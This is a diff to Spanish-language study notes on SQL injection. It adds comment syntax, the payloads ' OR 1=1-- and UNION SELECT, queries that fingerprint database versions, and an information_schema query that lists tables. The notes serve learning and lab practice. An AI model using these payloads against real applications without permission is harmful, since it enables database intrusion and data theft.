@@ -13,6 +13,8 @@
 -- | dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues de los simbolos, se ignora.
 ex: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
 
+# | dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues del simbolo, se ignora.
+
 ' OR 1=1-- | sirve para crear una consulta a un resultado booleano, de manera que el inicio de la consulta es leido, el resto no ya que
 es siempre TRUE.
 
@@ -43,7 +45,11 @@ ex: ' UNION SELECT @@version
 
 Microsoft >> SELECT @@version
 MySQL >> SELECT @@version
-Oracle >> SELECT * FROM v$version
+Oracle >> SELECT banner FROM v$version | SELECT version FROM v$instance
 PostgreSQL >> SELECT version()
 
+# LISTAR TABLAS DE LA BASE DE DATOS
+[ORACLE no tiene esta opcion]
+
+SELECT * FROM information_schema.tables
 
